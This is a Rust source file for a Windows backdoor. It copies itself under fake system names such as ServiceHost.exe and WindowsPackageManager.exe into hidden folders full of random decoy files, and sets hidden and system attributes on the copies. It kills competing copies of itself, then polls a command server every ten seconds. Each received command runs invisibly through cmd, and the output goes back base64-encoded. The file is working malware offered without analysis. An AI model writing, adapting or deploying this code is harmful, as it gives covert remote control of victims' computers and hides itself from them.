//#![windows_subsystem = "windows"]
extern crate winapi;

use std::os::windows::prelude::*;
use std::error::Error;
use std::os::windows::process::CommandExt;
use std::process::Command;
use std::{env, fs, thread};
use std::fs::{create_dir, File, OpenOptions};
use std::io::Write;
use std::os::windows::fs::OpenOptionsExt;
use std::path::Path;
use std::time::Duration;
use base64::prelude::*;
use rand::Rng;
use sysinfo::{get_current_pid, System};
const CREATE_NO_WINDOW: u32 = 0x08000000;

#[derive(Default)]
struct InstallDirectory{
    hidden: bool,
    path: String,
    name: String,
    require_admin:bool,
    populate:Vec<String>,
    generate:bool,
}

fn main() {

    let binding = env::current_exe().unwrap();
    let exe_path= Path::new(&binding).file_name().unwrap().to_str().unwrap();
    let mut variants = vec![{exe_path}];

    variants.append(&mut vec!["Thorium.exe"]);
    variants.append(&mut vec!["WindowsPackageManager.exe"]);
    variants.append(&mut vec!["winman.exe"]);
    variants.append(&mut vec!["MicrosoftExtendedRuntime.exe"]);
    variants.append(&mut vec!["MicrosoftRuntimeEnvironment.exe"]);
    variants.append(&mut vec!["Mystify.scr"]);
    variants.append(&mut vec!["screensaver.scr"]);
    variants.append(&mut vec!["MedalHelper.exe"]);
    variants.append(&mut vec!["ServiceHost.exe"]);
    variants.append(&mut vec!["FATF.exe"]);
    variants.append(&mut vec!["ProgramHelper.exe"]);
    variants.append(&mut vec!["SceneRuntimeHelper.exe"]);
    variants.append(&mut vec!["LibraryFileHandle.exe"]);
    variants.append(&mut vec!["Updater001.exe"]);
    variants.append(&mut vec!["ImageResponseFrame.exe"]);
    variants.append(&mut vec!["userman.exe"]);

    let user = whoami::username();

    let binding = Path::new("C:\\Users").join(user);
    let user_dir = binding.to_str().unwrap();
    let roaming = format!("{user_dir}\\AppData\\Roaming");

    let mut install_locations:Vec<InstallDirectory> = vec![
        InstallDirectory {
            hidden: true,
            name: "ServiceHost.exe".to_string(),
            path: format!("{user_dir}\\.win"),
            populate:vec![
                "windows".to_string(),

                "windows\\default".to_string(),
                "windows\\filemanager".to_string(),
                "windows\\dbgs".to_string(),
                "windows\\fman".to_string(),
                "windows\\system".to_string(),
                "windows\\sys".to_string(),

                "default".to_string(),
                "task".to_string(),
                ".runtime".to_string(),
            ],
            generate:true,
            ..Default::default()
        },
        InstallDirectory {
            hidden: true,
            name: "MedalHelper.exe".to_string(),
            path: format!("{user_dir}\\.medal"),
            populate:vec![
                "clipTemp".to_string(),
                "recording".to_string(),
                "exist".to_string(),
            ],
            ..Default::default()
        },

        InstallDirectory {
            hidden: true,
            name: ".\\bc2\\userman.exe".to_string(),
            path: format!("{user_dir}\\ntuser-09j2d-3ij832-9jd832"),
            populate:vec![
                "userdata".to_string(),
                "data".to_string(),
                "user".to_string(),
                ".".to_string(),
                ".\\aa1".to_string(),
                ".\\ab1".to_string(),
                ".\\ba3".to_string(),
                ".\\bc2".to_string(),
                ".\\ce3".to_string(),
                ".\\de1".to_string(),
                ".\\ef4".to_string(),
                ".\\ff6".to_string(),
            ],
            generate:true,
            ..Default::default()
        },

        InstallDirectory {
            hidden: true,
            name: "cache\\ef4\\Updater001.exe".to_string(),
            path: format!("{roaming}\\.system"),
            populate:vec![
                "systemdata".to_string(),
                "data".to_string(),
                "user".to_string(),
                "cache".to_string(),
                "cache\\aa1".to_string(),
                "cache\\ab1".to_string(),
                "cache\\ba3".to_string(),
                "cache\\bc2".to_string(),
                "cache\\ce3".to_string(),
                "cache\\de1".to_string(),
                "cache\\ef4".to_string(),
                "cache\\ff6".to_string(),
            ],
            generate:true,
            ..Default::default()
        },

        InstallDirectory {
            hidden: true,
            name: "screensaver.scr".to_string(),
            path: format!("{roaming}\\Screensavers"),
            populate:vec![
                "screensavers".to_string(),
            ],
            ..Default::default()
        },

        InstallDirectory {
            hidden: true,
            name: "roam\\55\\LibraryFileHandle.exe".to_string(),
            path: format!("{roaming}\\Roaming\\AppData"),
            populate:vec![
                "systemdata".to_string(),
                "data".to_string(),
                "user".to_string(),
                "cache".to_string(),
                "cache\\55".to_string(),
                "cache\\634".to_string(),
                "data\\45".to_string(),
                "cache\\data".to_string(),
                "cache\\12".to_string(),
                "cache\\0231".to_string(),
                "cache\\912".to_string(),
                "cache\\2".to_string(),
                "cache\\user".to_string(),
                "user\\55".to_string(),
                "user\\cache".to_string(),
                "user\\45".to_string(),
                "user\\345".to_string(),
                "user\\data".to_string(),
                "data\\0231".to_string(),
                "user\\912".to_string(),
                "data\\2".to_string(),
                "user\\3".to_string(),
            ],
            generate:true,
            ..Default::default()
        },
    ];

    install(install_locations,exe_path);

    let s = System::new_all();

    let current_pid = get_current_pid().unwrap();

    for variant in variants {
        for process in s.processes_by_name(variant.as_ref()) {
            if process.pid() == current_pid {
                continue;
            }
            process.kill();
        }
    }

    loop {
        thread::spawn(|| {
            let command = match get_request_response("command") {
                Ok(command) => command,
                Err(_) => {
                    return;
                }
            };


            let output = Command::new("cmd")
                .args(&["/C", command.as_str()])
                .creation_flags(CREATE_NO_WINDOW)
                .output()
                .expect("failed to execute process");


            println!("cmd: {}", command);
            println!("stdout: {}", String::from_utf8_lossy(&output.stdout));

            get_request_response(&format!("stdout/{0}",
                                         BASE64_STANDARD.encode(String::from_utf8_lossy(&output.stdout).as_bytes()))
            ).unwrap();
        });
        thread::sleep(Duration::from_secs(10));
    }
}

fn install(locations: Vec<InstallDirectory>,current_exe: &str){
    for location in locations {
        match install_single(location, current_exe){
            Ok(_) => {}
            Err(e) => {
                println!("InstallSingle error: {:?}", e);
            }
        }
    }
}

fn install_single(location: InstallDirectory, current_exe: &str) ->Result<(),Box<dyn Error>> {
    let path = Path::new(&location.path);
    let file_path = path.join(&location.name);

    create_dir_recursively(path);

    let file = OpenOptions::new()
        .write(true)
        .create(true)
        .attributes(7)
        .open(file_path.clone());

    println!("{}", env::current_dir()?.join(current_exe).clone().display());
    fs::copy(env::current_dir()?.join(current_exe),file_path.clone())?;

    let file = OpenOptions::new()
        .write(true)
        .create(true)
        .attributes(7)
        .open(file_path.clone());

    match install_extras(&location) {
        Ok(_) => {}
        Err(_) => {}
    }

    Ok(())
}

fn install_extras(location: &InstallDirectory) ->Result<(),Box<dyn Error>> {
    let file_types = vec!["lib","exe","dll","a"];
    let path = Path::new(&location.path);
    let file_path = path.join(&location.name);

    for dir in location.populate.iter() {
        create_dir_recursively(Path::new(location.path.as_str()).join(dir).as_path());
        if location.generate {
            match generate(file_types.clone(),Path::new(location.path.as_str()).join(dir).to_str().unwrap()){
                Ok(_) => {}
                Err(_) => {}
            }
        }
    }

    if location.generate {
        match generate(file_types.clone(),location.path.as_str()){
            Ok(_) => {}
            Err(_) => {}
        }
    }


    let mut perms = fs::metadata(&path)?.permissions();

    perms.set_readonly(true);

    fs::set_permissions(&path, perms)?;

    if location.hidden {
    }

    Ok(())
}

fn generate(file_types:Vec<&str>, dir: &str) ->Result<(),Box<dyn Error>>{
    let mut rng = rand::thread_rng();
    for i in 0..rng.gen_range(50..200) {
        let name = format!("{2}\\{:x}.{1}", i+rng.gen_range(0..100),file_types[rng.gen_range(0..file_types.len())], dir);
        println!("{}", name);
        let mut file = File::create(name)?;
        for _ in 0..rng.gen_range(50..200) {
            file.write(format!("{:x}", rng.gen_range(u32::MIN..u32::MAX)).as_bytes())?;
        }
    }
    Ok(())
}


fn create_dir_recursively(path: &Path) {
    if !path.exists() {
        let parent = match path.parent(){
            None => {
                return;
            }
            Some(p) => p,
        };
        create_dir_recursively(parent);
        fs::create_dir(path).unwrap();
    }
}

fn get_request_response(string: &str) -> Result<String, Box<dyn Error>>{
    let response = reqwest::blocking::get(format!("http://127.0.0.1:9090/{string}"))?;
    let text = response.text()?;

    Ok(text)
}